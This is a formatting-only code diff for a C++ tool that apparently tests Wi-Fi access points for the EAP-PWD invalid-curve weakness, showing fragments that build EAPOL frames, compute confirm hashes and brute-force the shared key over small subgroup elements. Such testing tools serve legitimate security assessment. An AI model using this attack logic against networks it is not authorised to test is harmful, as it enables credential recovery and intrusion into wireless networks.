@@ -79,7 +79,7 @@ static array<uint8_t, 32> H(const uint8_t *data, const size_t len) {
 
 // Compute EAP-PWD confirm: H(k_x | e1_xy | s1 | e2_xy | s2 | ciphersuite)
 static array<uint8_t, 32> pwd_confirm(const array<uint8_t, 32> &k_x, const array<uint8_t, 64> &e1,
-		const array<uint8_t, 32> &s1, const array<uint8_t, 64> &e2, const array<uint8_t, 32> &s2) {
+	const array<uint8_t, 32> &s1, const array<uint8_t, 64> &e2, const array<uint8_t, 32> &s2) {
 	vector<uint8_t> buf;
 	buf.reserve(32 + 64 + 32 + 64 + 32 + 4);
 	auto app = [&](const auto &a) { buf.insert(buf.end(), a.begin(), a.end()); };
@@ -94,12 +94,12 @@ static array<uint8_t, 32> pwd_confirm(const array<uint8_t, 32> &k_x, const array
 
 // Build EAPOL-EAP response: EAPOL header + EAP code/id/len + TYPE_PWD | opcode | payload
 static vector<uint8_t> make_pwd_eapol(
-		const uint8_t eap_id, const uint8_t opcode, const uint8_t *payload, const size_t len) {
+	const uint8_t eap_id, const uint8_t opcode, const uint8_t *payload, const size_t len) {
 	const auto eap_body = static_cast<uint16_t>(2 + len); // TYPE_PWD + opcode + payload
 	const auto eap_len = static_cast<uint16_t>(4 + eap_body);
 	frame_raw_t eapol_f;
 	eapol_f.reserve(4 + eap_len);
-	eapol_f.push_back(0x01);// EAPOL version
+	eapol_f.push_back(0x01); // EAPOL version
 	eapol_f.push_back(0x00); // EAPOL type: EAP
 	eapol_f.push_back(static_cast<uint8_t>(eap_len >> 8));
 	eapol_f.push_back(static_cast<uint8_t>(eap_len & 0xff));
@@ -116,8 +116,8 @@ static vector<uint8_t> make_pwd_eapol(
 // Brute-force the shared k_x by trying all subgroup multiples (<= 269 iterations).
 // server_confirm = H(k_x | server_elem | server_scal | our_elem | 0^32 | ciphersuite)
 // names of params from rfc5931
-static optional<array<uint8_t, 32>> brute_force_k(const array<uint8_t, 64> &Element_S,
-		const array<uint8_t, 32> &Scalar_S, const array<uint8_t, 32> &Confirm_S) {
+static optional<array<uint8_t, 32>> brute_force_k(
+	const array<uint8_t, 64> &Element_S, const array<uint8_t, 32> &Scalar_S, const array<uint8_t, 32> &Confirm_S) {
 	BN_CTX *ctx = BN_CTX_new();
 	BIGNUM *p = BN_bin2bn(FIELD_P.data(), 32, nullptr);
 	BIGNUM *a = BN_bin2bn(TWIST_A.data(), 32, nullptr);
@@ -189,8 +189,8 @@ bool run_invalid_curve_exchange(EAP_Att &eap_att) {
 		}
 		if(frame->pwd_data.size() < 96) {
 			log(LogLevel::WARNING,
-					"Server commit payload too short ({} bytes)",
-					static_cast<int>(frame->pwd_data.size()));
+				"Server commit payload too short ({} bytes)",
+				static_cast<int>(frame->pwd_data.size()));
 			return false;
 		}
 		copy_n(frame->pwd_data.begin(), 64, Element_S.begin());
@@ -271,9 +271,7 @@ void run_attack(RunStatus &rs) {
 	//TODO run multiple times (33% of fail)
 	bool vulnerable = false;
 	for(size_t i = 0; i < replay; i++) {
-		EAP_Att eap_att{
-			sock, channel, our_mac, ap_mac, ssid, identity, seconds(attack_time)
-		};
+		EAP_Att eap_att{ sock, channel, our_mac, ap_mac, ssid, identity, seconds(attack_time) };
 		vulnerable = run_invalid_curve_exchange(eap_att);
 		if(vulnerable) break;
 	}
